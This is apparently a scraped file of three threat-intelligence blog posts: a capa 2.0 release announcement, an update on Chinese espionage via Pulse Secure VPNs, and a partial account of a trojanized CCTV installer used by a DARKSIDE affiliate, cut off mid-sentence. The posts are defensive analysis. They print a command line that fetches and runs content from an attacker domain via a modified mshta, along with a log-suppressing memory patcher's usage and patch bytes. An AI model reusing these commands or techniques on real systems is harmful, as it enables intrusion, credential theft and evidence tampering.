                "text": "We are excited to announce version 2.0 of our open-source tool called capa. capa automatically identifies capabilities in programs using an extensible rule set. The tool supports both malware triage and deep dive reverse engineering. If you haven’t heard of capa before, or need a refresher, check out our first blog post . You can download capa 2.0 standalone binaries from the project’s release page and checkout the source code on GitHub . capa 2.0 enables anyone to contribute rules more easily, which makes the existing ecosystem even more vibrant. This blog post details the following major improvements included in capa 2.0: New features and enhancements for the capa explorer IDA Pro plugin, allowing you to interactively explore capabilities and write new rules without switching windows More concise and relevant results via identification of library functions using FLIRT and the release of accompanying open-source FLIRT signatures Hundreds of new rules describing additional malware capabilities, bringing the collection up to 579 total rules, with more than half associated with ATT&CK techniques Migration to Python 3, to make it easier to integrate capa with other projects capa explorer and Rule Generator capa explorer is an IDAPython plugin that shows capa results directly within IDA Pro. The version 2.0 release includes many additions and improvements to the plugin, but we'd like to highlight the most exciting addition: capa explorer now helps you write new capa rules directly in IDA Pro! Since we spend most of our time in reverse engineering tools such as IDA Pro analyzing malware, we decided to add a capa rule generator. Figure 1 shows the rule generator interface. Figure 1: capa explorer rule generator interface Once you’ve installed capa explorer using the Getting Started guide, open the plugin by navigating to Edit > Plugins > FLARE capa explorer . You can start using the rule generator by selecting the Rule Generator tab at the top of the capa explorer pane. From here, navigate your IDA Pro Disassembly view to the function containing a technique you'd like to capture and click the Analyze button. The rule generator will parse, format, and display all the capa features that it finds in your function. You can write your rule using the rule generator's three main panes: Features , Preview , and Editor . Your first step is to add features from the Features pane. The Features pane is a tree view containing all the capa features extracted from your function. You can filter for specific features using the search bar at the top of the pane. Then, you can add features by double-clicking them. Figure 2 shows this in action. Figure 2: capa explorer feature selection As you add features from the Features pane, the rule generator automatically formats and adds them to the Preview and Editor panes. The Preview and Editor panes help you finesse the features that you've added and allow you to modify other information like the rule's metadata. The Editor pane is an interactive tree view that displays the statement and feature hierarchy that forms your rule. You can reorder nodes using drag-and-drop and edit nodes via right-click context menus. To help humans understand the rule logic, you can add descriptions and comments to features by typing in the Description and Comment columns. The rule generator automatically formats any changes that you make in the Editor pane and adds them to the Preview pane. Figure 3 shows how to manipulate a rule using the Editor pane. Figure 3: capa explorer editor pane The Preview pane is an editable textbox containing the final rule text. You can edit any of the text displayed. The rule generator automatically formats any changes that you make in the Preview pane and adds them to the Editor pane. Figure 4 shows how to edit a rule directly in the Preview pane. Figure 4: capa explorer preview pane As you make edits the rule generator lints your rule and notifies you of any errors using messages displayed underneath the Preview pane. Once you've finished writing your rule you can save it to your capa rules directory by clicking the Save button. The rule generator saves exactly what is displayed in the Preview pane. It’s that simple! We’ve found that using the capa explorer rule generator significantly reduces the amount of time spent writing new capa rules. This tool not only automates most of the rule writing process but also eliminates the need to context switch between IDA Pro and your favorite text editor allowing you to codify your malware knowledge while it’s fresh in your mind. To learn more about capa explorer and the rule generator check out the README . Library Function Identification Using FLIRT As we wrote hundreds of capa rules and inspected thousands of capa results, we recognized that the tool sometimes shows distracting results due to embedded library code. We believe that capa needs to focus its attention on the programmer’s logic and ignore supporting library code. For example, highly optimized C/C++ runtime routines and open-source library code enable a programmer to quickly build a product but are not the product itself . Therefore, capa results should reflect the programmer’s intent for the program rather than a categorization of every byte in the program. Compare the capa v1.6 results in Figure 5 versus capa v2.0 results in Figure 6. capa v2.0 identifies and skips almost 200 library functions and produces more relevant results. Figure 5: capa v1.6 results without library code recognition Figure 6: capa v2.0 results ignoring library code functions So, we searched for a way to differentiate a programmer’s code from library code. After experimenting with a few strategies, we landed upon the Fast Library Identification and Recognition Technology (FLIRT) developed by Hex-Rays . Notably, this technique has remained stable and effective since 1996, is fast, requires very limited code analysis, and enjoys a wide community in the IDA Pro userbase. We figured out how IDA Pro matches FLIRT signatures and re-implemented a matching engine in Rust with Python bindings . Then, we built an open-source signature set that covers many of the library routines encountered in modern malware. Finally, we updated capa to use the new signatures to guide its analysis. capa uses these signatures to differentiate library code from a programmer’s code. While capa can extract and match against the names of embedded library functions, it will skip finding capabilities and behaviors within the library code. This way, capa results better reflect the logic written by a programmer. Furthermore, library function identification drastically improves capa runtime performance: since capa skips processing of library functions, it can avoid the costly rule matching steps across a substantial percentage of real-world functions. Across our testbed of 206 samples, 28% of the 186,000 total functions are recognized as library code by our function signatures. As our implementation can recognize around 100,000 functions/sec, library function identification overhead is negligible and capa is approximately 25% faster than in 2020! Finally, we introduced a new feature class that rule authors can use to match recognized library functions: function-name . This feature matches at the file-level scope. We’ve already started using this new capability to recognize specific implementations of cryptography routines, such as AES provided by Crypto++ , as shown in the example rule in Figure 7. Figure 7: Example rule using function-name to recognize AES via Crypto++ As we developed rules for interesting behaviors, we learned a lot about where uncommon techniques are used legitimately. For example, as malware analysts, we most commonly see the cpuid instruction alongside anti-analysis checks, such as in VM detection routines. Therefore, we naively crafted rules to flag this instruction. But, when we tested it against our testbed, the rule matched most modern programs because this instruction is often legitimately used in high-optimized routines, such as memcpy , to opt-in to newer CPU features. In hindsight, this is obvious, but at the time it was a little surprising to see cpuid in around 15% of all executables. With the new FLIRT support, capa recognizes the optimized memcpy routine embedded by Visual Studio and won’t flag the embedded cpuid instruction, as its not part of the programmer’s code. When a user upgrades to capa 2.0, they’ll see that the tool runs faster and provides more precise results. Signature Generation To provide the benefits of python-flirt to all users (especially those without an IDA Pro license) we have spent significant time to create a comprehensive FLIRT signature set for the common malware analysis use-case. The signatures come included with capa and are also available at our GitHub under the Apache 2.0 license. We believe that other projects can benefit greatly from this. For example, we expect the performance of FLOSS to improve once we’ve incorporated library function identification. Moreover, you can use our signatures with IDA Pro to recognize more library code. Our initial signatures include: From Microsoft Visual Studio (VS), for all major versions from VS6 to VS2019: C and C++ run-time libraries Active Template Library (ATL) and Microsoft Foundation Class (MFC) libraries The following open-source projects as compiled with VS2015, VS2017, and VS2019: CryptoPP curl Microsoft Detours Mbed TLS (previously PolarSSL) OpenSSL zlib Identifying and collecting the relevant library and object files took a lot of work. For the older VS versions this was done manually. For newer VS versions and the respective open-source projects we were able to automate the process using vcpgk and Docker. We then used the IDA Pro FLAIR utilities to convert gigabytes of executable code into pattern files and then into signatures. This process required extensive research and much trial and error. For instance, we spent two weeks testing and exploring the various FLAIR options to understand the best combination. We appreciate Hex-Rays for providing high-quality signatures for IDA Pro and thank them for sharing their research and tools with the community. To learn more about the pattern and signature file generation check out the siglib repository. The FLAIR utilities are available in the protected download area on Hex-Rays’ website . Rule Updates Since the initial release, the community has more than doubled the total capa rule count from 260 to over 570 capability detection rules ! This means that capa recognizes many more techniques seen in real-world malware, certainly saving analysts time as they reverse engineer programs. And to reiterate, we’ve surfed a wave of support as almost 30 colleagues from a dozen organizations have volunteered their experience to develop these rules. Thank you! Figure 8 provides a high-level overview of capabilities capa currently captures, including: Host Interaction describes program functionality to interact with the file system, processes, and the registry Anti-Analysis describes packers, Anti-VM, Anti-Debugging, and other related techniques Collection describes functionality used to steal data such as credentials or credit card information Data Manipulation describes capabilities to encrypt, decrypt, and hash data Communication describes data transfer techniques such as HTTP, DNS, and TCP Figure 8: Overview of capa rule categories More than half of capa’s rules are associated with a MITRE ATT&CK technique including all techniques introduced in ATT&CK version 9 that lie within capa’s scope. Moreover, almost half of the capa rules are currently associated with a Malware Behavior Catalog (MBC) identifier. For more than 70% of capa rules we have collected associated real-world binaries. Each binary implements interesting capabilities and exhibits noteworthy features. You can view the entire sample collection at our capa test files GitHub page . We rely heavily on these samples for developing and testing code enhancements and rule updates. Python 3 Support Finally, we’ve spent nearly three months migrating capa from Python 2.7 to Python 3. This involved working closely with vivisect and we would like to thank the team for their support. After extensive testing and a couple of releases supporting two Python versions, we’re excited that capa 2.0 and future versions will be Python 3 only. Conclusion Now that you’ve seen all the recent improvements to capa, we hope you’ll upgrade to the newest capa version right away! Thanks to library function identification capa will report faster and more relevant results. Hundreds of new rules capture the most interesting malware functionality while the improved capa explorer plugin helps you to focus your analysis and codify your malware knowledge while it’s fresh. Standalone binaries for Windows, Mac, and Linux are available on the capa Releases page . To install capa from PyPi use the command pip install flare-capa . The source code is available at our capa GitHub page . The project page on GitHub contains detailed documentation, including thorough installation instructions and a walkthrough of capa explorer . Please use GitHub to ask questions, discuss ideas, and submit issues. We highly encourage you to contribute to capa’s rule corpus. The improved IDA Pro plugin makes it easier than ever before. If you have any issues or ideas related to rules, please let us know on the GitHub repository . Remember, when you share a rule with the community, you scale your impact across hundreds of reverse engineers in dozens of organizations.

                "text": "On April 20, 2021, Mandiant published detailed results of our investigations into compromised Pulse Secure devices by suspected Chinese espionage operators . This blog post is intended to provide an update on our findings, give additional recommendations to network defenders, and discuss potential implications for U.S.-China strategic relations. Mandiant continues to gather evidence and respond to intrusions involving compromises of Pulse Secure VPN appliances at organizations across the defense, government, high tech, transportation, and financial sectors in the U.S. and Europe (Figure 1). Reverse engineers on the FLARE team have identified four additional code families specifically designed to manipulate Pulse Secure devices. We now assess that espionage activity by UNC2630 and UNC2717 supports key Chinese government priorities. Many compromised organizations operate in verticals and industries aligned with Beijing’s strategic objectives outlined in China’s recent 14th Five Year Plan. While there is evidence of data theft at many organizations, we have not directly observed the staging or exfiltration of any data by Chinese espionage actors that could be considered a violation of the Obama-Xi agreement . Mandiant Threat Intelligence assesses that Chinese cyber espionage activity has demonstrated a higher tolerance for risk and is less constrained by diplomatic pressures than previously characterized. Figure 1: Organizations with compromised Pulse Secure devices by vertical and geographic location Pulse Secure continues to work closely with Mandiant, affected customers, government partners, and other forensic experts to address these issues. Pulse Secure’s parent company, Ivanti, has released patches to proactively address software vulnerabilities and issued updated Security Advisories and Knowledge Articles to assist customers. (Please see the Forensics, Remediation, and Hardening Guidelines section for additional details.) UNC2630 and UNC2717 Tradecraft and Response to Disclosure Mandiant is tracking 16 malware families exclusively designed to infect Pulse Secure VPN appliances and used by several cyber espionage groups which we believe are affiliated with the Chinese government. Between April 17 and April 20, 2021, Mandiant incident responders observed UNC2630 access dozens of compromised devices and remove webshells like ATRIUM and SLIGHTPULSE. Under certain conditions, the Integrity Checker Tool (ICT) will show no evidence of compromise on appliances which may have had historical compromise. This false negative may be returned because the ICT cannot scan the rollback partition. If a backdoor or persistence patcher exists on the rollback partition and a Pulse Secure appliance is rolled back to the prior version, the backdoor(s) will be present on the appliance. Please see the Forensics, Remediation, and Hardening Guidelines section for important information regarding the ICT and upgrade process. In at least one instance, UNC2630 deleted their webshell(s) but did not remove the persistence patcher, making it possible to regain access when the device was upgraded.  The remaining persistence patcher causes the malicious code to be executed later during a system upgrade, re-inserts webshell logic into various files on the appliance, and recompromises the device. It is unusual for Chinese espionage actors to remove a large number of backdoors across several victim environments on or around the time of public disclosure. This action displays an interesting concern for operational security and a sensitivity to publicity. Both UNC2630 and UNC2717 display advanced tradecraft and go to impressive lengths to avoid detection. The actors modify file timestamps and regularly edit or delete forensic evidence such as logs, web server core dumps, and files staged for exfiltration. They also demonstrate a deep understanding of network appliances and advanced knowledge of a targeted network. This tradecraft can make it difficult for network defenders to establish a complete list of tools used, credentials stolen, the initial intrusion vector, or the intrusion start date. Updates from Incident Response Investigations We continue to suspect that multiple groups including UNC2630 and UNC2717 are responsible for this activity, despite the use of similar exploits and tools. There is a high degree of variation in attacker actions within victim environments, with actors inconsistently using a combination of tools and command and control IP addresses. Reverse engineers on the FLARE team have identified four additional malware families specifically designed to manipulate Pulse Secure devices (Table 1). These utilities have similar functions to the 12 previously documented malware families: harvesting credentials and sensitive system data, allowing arbitrary file execution, and removing forensic evidence. Please see the Technical Annex for detailed analysis of these code families. Malware Family Description Actor BLOODMINE BLOODMINE is a utility for parsing Pulse Secure Connect log files. It extracts information related to logins, Message IDs and Web Requests and copies the relevant data to another file. UNC2630 BLOODBANK BLOODBANK is a credential theft utility that parses two files containing password hashes or plaintext passwords and expects an output file to be given at the command prompt. UNC2630 CLEANPULSE CLEANPULSE is a memory patching utility that may be used to prevent certain log events from occurring. It was found in close proximity to an ATRIUM webshell. UNC2630 RAPIDPULSE RAPIDPULSE is a webshell capable of arbitrary file read. As is common with other webshells, RAPIDPULSE exists as a modification to a legitimate Pulse Secure file. RAPIDPULSE can serve as an encrypted file downloader for the attacker. UNC2630 Table 1: New malware families identified Initial Compromise The actors leveraged several vulnerabilities in Pulse Secure VPN appliances. Mandiant observed the use of the recently patched vulnerability CVE-2021-22893 to compromise fully patched Pulse Secure appliances as well as previously disclosed vulnerabilities from 2019 and 2020. In many cases, determining the initial exploitation vector and timeframe was not possible to determine because the actors altered or deleted forensic evidence, or the appliance had undergone subsequent code upgrades thereby destroying evidence related to the initial exploitation. Establish Foothold In some cases, Mandiant observed the actors create their own Local Administrator account outside of established credential management controls on Windows servers of strategic value. This allowed the actor to maintain access to systems with short-cycle credential rotation policies and provided a sufficient level of access to operate freely within their target environment. The actors also maintained their foothold into the targeted environments exclusively through Pulse Secure webshells and malware without relying on backdoors deployed on internal Windows or Linux endpoints. Escalate Privileges Mandiant observed the actors use three credential harvesting techniques on Windows systems: Targeting of clear text passwords and hashes from memory using the credential harvesting tool Mimikatz. Instead of being copied locally and executed on the target system, Mandiant saw evidence of the Mimikatz binary on the source system of an RDP session (i.e. the threat actor’s system that was connected to the VPN) through an RDP mapped drive. Copying and exfiltration of the SAM, SECURITY, and SYSTEM registry hives which contained cached NTLM hashes for Local and Domain accounts. Leveraging the Windows Task Manager process to target the Local Security Authority Subsystem Service (LSASS) process memory for NTLM hashes. In addition to these privilege escalation techniques, the actors specifically targeted separate privileged accounts belonging to individuals whose unprivileged accounts were previously compromised (likely through the Pulse Secure credential harvesting malware families). It is unclear how the account associations were made by the actor. Internal Reconnaissance Mandiant found evidence that the actors renamed their own workstations that they connected to the VPN of victim networks to mimic the naming convention of their target environment. This practice aligns with the actor’s objective for long-term persistence and evading detection and demonstrates a familiarity with the internal hostnames in the victim environment. The actors operated solely by utilizing Windows-based utilities to carry out tasks. Some of the utilities observed were net.exe, quser.exe, powershell.exe, powershell_ise.exe, findstr.exe, netstat.exe, cmd.exe, reg.exe and tasklist.exe. Move Laterally Most lateral movement originated from compromised Pulse Secure VPN appliances to internal systems within the environment.  While connected to the Pulse VPN appliance, the actor’s system was assigned an IP address from the Pulse VPN DHCP pool and they moved laterally throughout the environments by leveraging the Remote Desktop Protocol (RDP), the Secure Shell Protocol (SSH), and browser-based communication to HTTPS hosted resources. The actors also accessed other resources such as Microsoft M365 cloud environments using stolen credentials they had previously acquired. Mandiant also observed the actors targeting ESXi host servers. The actor enabled SSH on ESXi hosts that were previously disabled via the web interface. When their operations on the system were finished, the actors disabled SSH on the ESXi host again and cleared or preemptively disabled all relevant logging associated with the performed activities. This includes authentication, command history, and message logging on the system. Maintain Presence Mandiant observed the threat actor maintain persistence by compromising the upgrade process on the Pulse Secure Appliance.  Persistence was primarily achieved by modifying the legitimate DSUpgrade.pm file to install the ATRIUM webshell across each upgrade performed by an administrator.  The actor likely chose DSUpgade.pm to host their patch logic as it is a core file in the system upgrade procedure, ensuring the patch is applied during updates. The patcher modifies content in /tmp/data as this directory holds the extracted upgrade image the newly upgraded system will boot into. This results in a persistence mechanism which allows the actor to maintain access to the system across updates. The actors also achieved persistence in other cases by prepending a bash script to the file /bin/umount normally used to unmount a Linux filesystem. This binary was targeted by the actor because it is executed by the Pulse Secure appliance during a system upgrade. The actor’s script verifies that the umount binary executes with a specific set of arguments, which are identical to the arguments used by the Pulse Secure appliance to executes the binary. The inserted malicious bash script remounts the filesystem as read-write and iterates through a series of bash routines to inject the ATRIUM webshell, hide SLOWPULSE from a legacy file integrity bash script, remove or add itself from the umount file, and validate the web process was running after a reboot to return the filesystem back to read-only. Complete Mission The threat actor’s objectives appear to be stealing credentials, maintaining long-term persistent access to victim networks, and accessing or exfiltrating sensitive data. Mandiant has observed the attackers: Staging data related to sensitive projects, often in C:\\Users\\Public Naming exfiltration archives to resemble Windows Updates (KB) or to match the format KB<digits>.zip Using the JAR/ZIP file format for data exfiltration Deleting exfiltrated archives Analysis of new malware families is included in the Technical Annex to enable defenders to quickly assess if their respective appliances have been affected. Relevant MITRE ATT&CK techniques, Yara rules and hashes are published on Mandiant’s GitHub page . Forensics, Remediation, and Hardening Guidelines To begin an investigation, Pulse Secure users should contact their Customer Support Representative for assistance completing the following steps: Capture memory and a forensic image of the appliance Run the Pulse Integrity Checker Tool found online Request a decrypted image of each partition and a memory dump To remediate a compromised Pulse Secure appliance: Caution must be taken when determining if a Pulse Secure device was compromised at any previous date. If the Integrity Checker Tool (ICT) was not run before the appliance was updated, the only evidence of compromise will exist in the system rollback partition which cannot be scanned by the ICT. If an upgrade was performed without first using the ICT, a manual inspection of the rollback partition is required to determine if the device was previously compromised. To ensure that no malicious logic is copied to a clean device, users must perform upgrades from the appliance console rather than the web interface. The console upgrade process follows a separate code path that will not execute files such as DSUpgrade.pm. Previous versions of the ICT will exit if run on an unsupported software version. For every ICT scan, ensure that the ICT would have supported the device's version number. Reset all passwords in the environment. Upgrade to the most recent software version. To secure the appliance and assist with future investigations, consider implementing the following: Enable unauthenticated logging and configure syslog for Events, User & Admin Access Forward all logs to a central log repository Review logs for unusual authentications and evidence of exploitation Regularly run the Integrity Checker Tool Apply patches as soon as they are made available Geopolitical Context and Implications for U.S.-China Relations In collaboration with intelligence analysts at BAE Systems Applied Intelligence, Mandiant has identified dozens of organizations across the defense, government, telecommunications, high tech, education, transportation, and financial sectors in the U.S. and Europe that have been compromised via vulnerabilities in Pulse Secure VPNs. Historic Mandiant and BAE investigations identified a significant number of these organizations as previous APT5 targets. Notably, compromised organizations operate in verticals and industries aligned with Beijing’s strategic objectives as outlined in China’s 14th Five Year Plan. Many manufacturers also compete with Chinese businesses in the high tech, green energy, and telecommunications sectors. Despite this, we have not directly observed the staging or exfiltration of any data by Chinese espionage actors that could be considered a violation of the Obama-Xi agreement. Targets of Chinese cyber espionage operations are often selected for their alignment with national strategic goals, and there is a strong correlation between pillar industries listed in policy white papers and targets of Chinese cyber espionage activity. China has outlined eight key areas of vital economic interest for development and production which it views as essential to maintaining global competitiveness, under the following categories: energy, healthcare, railway transportation, telecommunications, national defense and stability, advanced manufacturing, network power, and sports and culture. Historical Context In the Red Line Drawn report, Mandiant documented a significant decline in the volume of Chinese cyberespionage activity in 2014 and assessed that the restructuring of China's military and civilian intelligence agencies significantly impacted Chinese cyber operations. Then, in September 2015, President Xi of China concluded a bilateral agreement with U.S. President Obama to prohibit state-sponsored theft of intellectual property for the purpose of providing commercial advantage. Commercial IP theft has historically been a prominent characteristic of Chinese cyber espionage activity. In 2018 we conducted an extensive review of Chinese cyber espionage operations, both before and after the official announcement of the PLA reforms and bilateral agreement to determine if there were any corresponding changes in the tactics, techniques, and procedures (TTPs) used during Chinese cyberespionage operations. We observed two important changes in the type of information stolen and the geographic distribution of the targets. Despite examining hundreds of incidents from January 2016 through mid 2019, we did not find definitive evidence of purely commercial application intellectual property theft in the US. Recent indictments by the US Department of Justice suggest that this theft did occur. While we observed other malicious activity, including geopolitical targeting, theft of intellectual property with military applications, and theft of confidential business information, we did not find evidence that these cyber operations violated the Obama-Xi agreement. Between January 2016 and mid-2019, the geographic focus of Chinese cyber operations shifted dramatically to Asia and away from the U.S. and Europe. While the U.S. remained the single most frequently targeted country, it became a much smaller percentage of observed activity. From 2012–2015, U.S. targeting constituted nearly 70 percent of all observed Chinese cyber espionage, while from January 2016 through August 2019, U.S. targeting fell to approximately 20 percent of Chinese activity. Targeting of Europe represented a similar proportion of overall Chinese activity to targeting of the Americas. Changes in Chinese Espionage Activity between 2019 and 2021 Based on developments observed between 2019-2021, Mandiant Threat Intelligence assesses that most Chinese APT actors now concentrate on lower-volume but more-sophisticated, stealthier operations collecting strategic intelligence to support Chinese strategic political, military, and economic goals. While some of the technical changes may be the result of the restructuring of China's military and civilian organizations, some changes possibly reflect larger technical trends in cyber operations overall. Before the reorganization, it was common to observe multiple Chinese espionage groups targeting the same organization, often targeting the same types of information. Post-2015, this duplication of efforts is rare. Chinese espionage groups developed more efficient and purposeful targeting patterns by transitioning away from spearphishing and relying on end user software vulnerabilities and instead began exploiting networking devices and web facing applications in novel ways. Chinese APT actors also began to leverage supply chain vulnerabilities and to target third party providers to gain access to primary targets. Recently observed Chinese cyber espionage activity exhibits an increased diligence in operational security, familiarity with network defender investigation techniques, and cognizance of the forensic evidence they leave behind. We observe the resurgence of older Chinese espionage groups, including APT4 and APT5 after long periods of dormancy and currently active groups engage in frequent and widespread campaigns. Redline Withdrawn? The Obama-Xi agreement prohibits the theft of intellectual property with purely commercial applications for the purpose of gaining a competitive advantage. It does not cover government or diplomatic information, sensitive business communications, IT data, PII, or intellectual property with military or dual use applications. We have direct evidence of UNC2630, UNC2717 and other Chinese APT actors stealing credentials, email communications, and intellectual property with dual commercial and military applications. Throughout our investigations, we did not directly observe the staging or exfiltration of any data by Chinese espionage actors that could be considered a violation of the Obama-Xi agreement. Given the narrow definition of commercial intellectual property theft and the limited availability of forensic evidence, it is possible that our assessment will change with the discovery of new information. Evidence collected by Mandiant over the past decade suggests that norms and diplomatic agreements do not significantly limit China's use of its cyber threat capabilities, particularly when serving high-priority missions. The greater ambition and risk tolerance demonstrated by Chinese policymakers since 2019 indicates that the tempo of Chinese state-sponsored activity may increase in the near future and that the Chinese cyber threat apparatus presents a renewed and serious threat to US and European commercial entities.

BLOODBANK takes advantage of a legitimate process that supports Single Sign On functionality and looks for plaintext passwords when they are briefly loaded in memory. The utility parses the following two files containing password hashes or plaintext passwords: /home/runtime/mtmp/lmdb/data0/data.mdb /home/runtime/mtmp/system BLOODBANK expects an output file as a command line parameter, otherwise it prints file open error. It contains the following strings which it likely tries to extract and target. PRIMARY SECONDARY remoteaddr user@ logicUR logicTim passw@ userAge realm Sourc CLEANPULSE CLEANPULSE is a memory patching utility that may be used to prevent certain log events from occurring. The utility inserts two strings from the command line into the target process and patches code to conditionally circumvent a function call in the original executable. File Name File Type Size Compile Time dsrlog ELF.X86 13332 The utility expects to be run from the command line as follows: drslog <pid> <code2_string> <code3_string> <command> Where <pid> is the pid process ID to patch in memory, <code2_string> and <code3_string> are two strings to write into the target process, and <command> is either 'e' or 'E' for installation or 'u' or 'U' for uninstallation. During installation (using the 'e' or 'E' <command>), the <code2_string> <code3_string> command line strings are written to the target process at hard-coded memory addresses, a small amount of code is written, and a jump instruction to the code snippet is patched in memory of the target process. The added code checks whether an argument is equal to either <code2_string> <code3_string> strings, and if, so skips a function call in the target process. During uninstall (using the 'u' or 'U' <command>) the patch jump location is overwritten with what appears to be the original 8 bytes of instructions, and the two additional memory buffers and the code snippet appear to be overwritten with zeros. The CLEANPULSE utility is highly specific to a victim environment. It does not contain any validation code when patching (i.e. verifying that code is expected prior to modifying it), and it contains hard-coded addresses to patch. The target code to patch appears to be the byte sequence: 89 4C 24 08 FF 52 04. This appears as the last bytes in the patched code, and is the 8-bytes written when the uninstall 'u' command is given. These bytes correspond to the following two instructions: .data:0804B138 89 4C 24 08                 mov     [esp+8], ecx .data:0804B13C FF 52 04                       call    dword ptr [edx+4] This byte sequence occurs at the hard-coded patch address the utility expects, dslogserver. Based on status and error messages in nearby functions the executable dslogserver appears to be related to log event handling, and the purpose of the CLEANPULSE utility may be to prevent certain events from being logged. There are several un-referenced functions that appear to have been taken from the open source project PUPYRAT. It is likely that the actor re-purposed this open source code, using PUPYRAT as a simple template project. RAPIDPULSE RAPIDPULSE is a webshell capable of arbitrary file read. As is common with other webshells, RAPIDPULSE exists as a modification to a legitimate Pulse Secure file. The webshell modifies the legitimate file's main routine which compares the HTTP query parameter with key name: deviceid to a specific  key with value. If the parameter matches, then the sample uses an RC4 key  to decrypt HTTP query parameter with key name: hmacTime. This decrypted value is a filename which the sample then opens, reads, RC4 encrypts with the same key, base64 encodes, then writes to stdout. The appliance redirects stdout as the response to HTTP requests. This serves as an encrypted file download for the attacker. Integrity Checker Tool and Other Validation Checks In our public report, we noted two code families that manipulate check_integrity.sh, a legitimate script used during a normal system upgrade. This validation script was modified by the actor to exit early so that it would not perform the intended checks. Per Ivanti, the validation provided by check_integrity.sh is a separate validation feature and not the same as the Integrity Checker Tool (ICT) available on their website. They recommend that organizations use the online ICT to confirm that hashes of files on their Pulse Secure devices match Ivanti’s list of known good hashes. Please note that the ICT does not scan the rollback partition. Subscribe to Blogs Get email updates as new blog posts are added."

                "text": "Mandiant observed DARKSIDE affiliate UNC2465 accessing at least one victim through a Trojanized software installer downloaded from a legitimate website. While this victim organization detected the intrusion, engaged Mandiant for incident response, and avoided ransomware, others may be at risk. As reported in the Mandiant post, \" Shining a Light on DARKSIDE Ransomware Operations ,\" Mandiant Consulting has investigated intrusions involving several DARKSIDE affiliates. UNC2465 is one of those DARKSIDE affiliates that Mandiant believes has been active since at least March 2020. The intrusion that is detailed in this post began on May 18, 2021, which occurred days after the publicly reported shutdown of the overall DARKSIDE program ( Mandiant Advantage background ). While no ransomware was observed here, Mandiant believes that affiliate groups that have conducted DARKSIDE intrusions may use multiple ransomware affiliate programs and can switch between them at will. Sometime in May 2021 or earlier, UNC2465 likely Trojanized two software install packages on a CCTV security camera provider website. Mandiant determined the installers were malicious in early June and notified the CCTV company of a potential website compromise, which may have allowed UNC2465 to replace legitimate downloads with the Trojanized ones. While Mandiant does not suspect many victims were compromised, this technique is being reported for broader awareness. Software supply chain attacks can vary greatly in sophistication, from the recent FireEye-discovered SolarWinds attacks to attacks such as this targeting smaller providers. A software supply chain attack allows a single intrusion to obtain the benefit of access to all of the organizations that run that victim company’s software; in this case, an installer, rather than the software itself, was modified by UNC2465. DARKSIDE RaaS In mid-May 2021, Mandiant observed multiple threat actors cite an announcement that appeared to be shared with DARKSIDE RaaS affiliates by the operators of the service. This announcement stated that they lost access to their infrastructure, including their blog, payment, and content distribution network (CDN) servers, and would be closing their service. The post cited law enforcement pressure and pressure from the United States for this decision. Multiple users on underground forums have since come forward claiming to be unpaid DARKSIDE affiliates, and in some cases privately provided evidence to forum administrators who confirmed that their claims were legitimate. There are some actors who have speculated that the DARKSIDE operator’s decision to close could be an exit scam. While we have not seen evidence suggesting that the operators of the DARKSIDE service have resumed operations, we anticipate that at least some of the former affiliates of the DARKSIDE service will likely identify different ransomware or malware offerings to use within their own operations. Notably, Mandiant has continued to observe a steady increase in the number of publicly named victims on ransomware shaming sites within the past month. Despite the recent ban of ransomware-related posts within underground forums, threat actors can still leverage private chats and connections to identify ransomware services. As one example, in mid-May 2021, the operator of the SODINOKIBI (aka REvil) RaaS indicated that multiple affiliates from other RaaS platforms that had shut down were switching to their service. Based on the perceived profitability of these operations, it is almost certain that numerous threat actors will continue to conduct widespread ransomware operations for the foreseeable future. Background In June 2021, Mandiant Consulting was engaged to respond to an intrusion. During analysis, Mandiant determined the initial vector was a trojanized security camera PVR installer from a legitimate website. Mandiant attributed the overall intrusion activity to DARKSIDE affiliate UNC2465 due to continued use of infrastructure and tooling since October 2020. On May 18, 2021, a user in the affected organization browsed to the Trojanized link and downloaded the ZIP. Upon installing the software, a chain of downloads and scripts were executed, leading to SMOKEDHAM and later NGROK on the victim’s computer. Additional malware use such as BEACON, and lateral movement also occurred. Mandiant believes the Trojanized software was available from May 18, 2021, through June 8, 2021. Pivoting on the slightly modified, but benign, MSHTA.exe application in VirusTotal, Mandiant identified a second installer package with the MD5 hash, e9ed774517e129a170cdb856bd13e7e8 (SVStation_Win64-B1130.1.0.0.exe), from May 26, 2021, which also connects out the same URL as the Trojanized SmartPSS installer. Supply Chain Intrusion Cycle Figure 1: Intrusion cycle Phase 1: Trojanized Installer Download Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before. The downloaded file was extracted to C:\\Users\\[username]\\Downloads\\06212019-General-SMARTPSS-Win32-ChnEng-IS\\General_SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023\\SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe. Mandiant confirmed the user intended to download, install, and use the SmartPSS software. Figure 2 shows an image of the download page used for SmartPSS software. Figure 2: SmartPSS download page Phase 2: Nullsoft Installer The installer executable is a Nullsoft installer that when executed wrote two files to C:\\ProgramData\\SMARTPSS-Win32_ChnEng_IS. We were able to extract the malicious installer script and files for analysis using 7-Zip. The relevant section of this installer script is shown below in Figure 3. Figure 3: Nullsoft installer script section The installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe (c180f493ce2e609c92f4a66de9f02ed6). The former is a clean installer from the original developer and is launched first, installing the software as the user may expect. The latter is launched with a command line URL executing the content. The smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate operating system component, but the MD5 hash was unknown. Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided. This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy. Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4. Figure 4: CyberChef diff between MSHTA.exe and smartpss.exe Phase 3: Downloaded VBScript and PowerShell Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line. Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported. According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions. C:\\PROGRAMDATA\\SMARTPSS-Win32_ChnEng_IS\\smartpss.exe hxxp://sdoc[.]xyz/ID-508260156241 The execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory. Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the 